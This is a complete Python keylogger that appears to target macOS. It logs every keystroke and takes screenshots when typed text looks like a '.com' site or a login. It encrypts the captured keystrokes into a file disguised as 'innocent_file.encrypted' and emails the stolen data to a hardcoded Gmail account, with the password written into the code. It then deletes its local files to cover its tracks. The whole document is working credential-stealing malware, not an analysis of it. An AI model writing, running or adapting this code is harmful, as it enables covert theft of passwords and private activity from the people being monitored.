#!/usr/bin/python3

import pynput
from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import os
import cryptography
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import sys

keychain = []
site = []
login = 0
to_four = 0
max_size = 100

all_output = "my_output.txt"
filepath = os.path.expanduser("~/Desktop/SA")
ab_filepath = os.path.expanduser("~/Desktop/SA/my_output.txt")
ab_keypath = os.path.expanduser("~/Desktop/SA/public_key.pem")
ab_epath = os.path.expanduser("~/Desktop/SA/innocent_file.encrypted")
ab_ss = os.path.expanduser("~/Desktop/SA/screenshot.png")

email_acc = "mytestingemail6x4x4x1@gmail.com"
email_pw = "6441TEST!"

session = "not found"
detect_site = "Website Found "
detect_login = "Login Found "

def on_press(key):
	global keychain, site, to_four, login

	check_len = ''.join(keychain)
	if len(check_len) >= max_size:
		manage_files()
	

	key = str(key).strip("'")
	key = prettify(key)
	
	keychain.append(key)

	if to_four > 0:
		is_site(key)

	if key == '.':
		if login > 0:
			is_login()
			login = 0

		else:
			if site:
				site = []
			is_site(key)

	if key == '@':
		login = login ^ 1

def prettify(key):
	if key.find('Key') != -1:
		key = '[' + key[4:] + ']'

	if key == '[enter]':
		key = '\n'

	if key == '[space]':
		key = ' '

	return key

def is_site(key):
	global site, to_four

	if(to_four <4):
		to_four = to_four + 1
		site.append(key)

	elif(to_four == 4):
		check_str = ''.join(site)
		if  check_str == '.com':
			screenshot()
			send_email("screenshot.png", filepath + "/" + "screenshot.png", email_acc, detect_site + session)
			site = []
		else:
			site = []
		to_four = 0

def is_login():
	screenshot()
	send_email("screenshot.png", filepath + "/" + "screenshot.png", email_acc, detect_login + session)

def on_release(key):
	global keychain

	if key == Key.esc:
		manage_files()
		return False

def write_to(keychain):
	with open(ab_filepath, "a") as file:
		for key in keychain:
			file.write(key)

def send_email(name, path, email, subject):
	msg = MIMEMultipart()
	msg['From'] = email
	msg['To'] = email
	msg['Subject'] = subject
	body = "Session: " + session
	msg.attach(MIMEText(body, 'plain'))
	filename = name
	attachment = open(path, "rb")

	p = MIMEBase('application','octet-stream')
	p.set_payload((attachment).read())

	encoders.encode_base64(p)
	p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

	msg.attach(p)
	s = smtplib.SMTP('smtp.gmail.com', 587)
	s.starttls()
	s.login(email, email_pw)

	text = msg.as_string()
	s.sendmail(email, email, text)
	s.quit()

def screenshot():
	os.system("screencapture ~/Desktop/SA/screenshot.png")

def encrypt_keys():
	with open(ab_keypath, "rb") as key_file:
		public_key = serialization.load_pem_public_key(
			key_file.read(),
			backend=default_backend()
		)

	file = open(ab_filepath, 'rb')
	log = file.read()
	file.close()

	e = public_key.encrypt(
		log,
		padding.OAEP(
	        mgf=padding.MGF1(algorithm=hashes.SHA256()),
	        algorithm=hashes.SHA256(),
	        label=None
    	)
	)

	file = open(ab_epath, 'wb')
	file.write(e)
	file.close()

def manage_files():
	global keychain

	write_to(keychain)
	encrypt_keys()

	#send_email(all_output, filepath + "/" + all_output, email_acc, session)
	send_email("innocent_file.encrypted", filepath + "/innocent_file.encrypted", email_acc, session)
	dispose()

	keychain = []

def dispose():
	if os.path.isfile(ab_filepath): 
		os.remove(ab_filepath)
	if os.path.isfile(ab_epath):
		os.remove(ab_epath)
	if os.path.isfile(ab_ss):
		os.remove(ab_ss)

with Listener(on_press=on_press, on_release=on_release) as listener:
	session = datetime.now()
	session = session.strftime("%m/%d/%Y, %H:%M:%S")
	listener.join()